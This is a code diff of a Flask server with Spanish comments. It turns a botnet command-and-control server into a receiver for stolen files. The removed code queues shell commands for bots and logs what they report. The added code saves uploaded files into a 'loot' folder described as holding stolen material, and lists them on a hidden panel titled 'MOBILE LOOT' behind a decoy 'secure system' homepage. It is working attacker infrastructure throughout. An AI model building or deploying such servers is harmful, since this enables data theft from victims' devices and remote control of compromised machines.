@@ -1,38 +1,32 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, render_template_string
 import datetime
+import os
 
 app = Flask(__name__)
 
-# Almacén de órdenes y reportes
-pending_tasks = ["whoami", "dir"] # Órdenes iniciales para probar
-bot_reports = []
+# Directorio para guardar lo robado
+UPLOAD_FOLDER = 'loot'
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
 
-@app.route('/svr_c2/check_in', methods=['POST'])
-def bot_checkin():
-    data = request.json
-    with open("bots_activos.txt", "a") as f:
-        f.write(f"[{datetime.datetime.now()}] BOT DETECTADO: {data}\n")
-    return "OK", 200
-
-@app.route('/svr_c2/get_task')
-def get_task():
-    if pending_tasks:
-        return pending_tasks.pop(0)
-    return "sleep"
-
-@app.route('/svr_c2/report', methods=['POST'])
-def report():
-    output = request.form.get('output')
-    with open("bot_output.txt", "a") as f:
-        f.write(f"\n--- REPORTE [{datetime.datetime.now()}] ---\n{output}\n")
+@app.route('/svr_upload', methods=['POST'])
+def upload_file():
+    if 'file' not in request.files:
+        return "No file", 400
+    file = request.files['file']
+    file.save(os.path.join(UPLOAD_FOLDER, file.filename))
     return "OK", 200
 
 @app.route('/panel-secreto-svr')
-def ver_consola():
-    try:
-        with open("bot_output.txt", "r") as f: logs = f.read()
-    except: logs = "Sin reportes de bots."
-    return f"<html><body style='background:#000; color:#0f0;'><pre>🛰️ CONSOLA C2 - SVR-SHADOW\n{logs}</pre></body></html>"
+def ver_loot():
+    files = os.listdir(UPLOAD_FOLDER)
+    return f"<html><body style='background:#000; color:#0f0;'><h2>🛰️ SVR-MATRIX: MOBILE LOOT</h2><ul>" + \
+           "".join([f"<li><a href='/download/{f}' style='color:#0f0;'>{f}</a></li>" for f in files]) + \
+           "</ul></body></html>"
+
+@app.route('/')
+def home():
+    return "<h1>SVR-SECURE: SISTEMA ACTIVO</h1>"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
